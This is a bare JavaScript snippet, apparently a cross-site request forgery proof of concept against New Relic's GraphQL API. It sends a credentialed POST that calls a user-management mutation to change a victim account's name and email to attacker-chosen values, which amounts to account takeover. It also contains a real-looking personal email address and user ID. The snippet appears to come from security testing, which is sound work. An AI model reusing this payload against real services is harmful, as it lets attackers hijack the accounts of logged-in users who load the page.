var xhr = new XMLHttpRequest();
        xhr.open("POST", "https:\/\/one.newrelic.com\/graphql", true);
        xhr.setRequestHeader("accept", "*\/*");
        xhr.setRequestHeader("Newrelic-Requesting-Services", "platform|nr1-ui");
        xhr.setRequestHeader("accept-language", "en-US,en;q=0.5");
        xhr.setRequestHeader("content-type", "application\/json; charset=utf-8");
        xhr.withCredentials = true;
        var body = "{\"query\":\"mutation UpdateUsersNameAndEmail($id:ID!$name:String$email:String){userManagementUpdateUser(updateUserOptions:{id:$id name:$name email:$email}){user{id name email __typename}__typename}}\",\"variables\":{\"id\":\"1006224090\",\"name\":\"aaa\",\"email\":\"romeokarki24+3@gmail.com\"}}";
        var aBody = new Uint8Array(body.length);
        for (var i = 0; i < aBody.length; i++)
          aBody[i] = body.charCodeAt(i); 
        xhr.send(new Blob([aBody]));
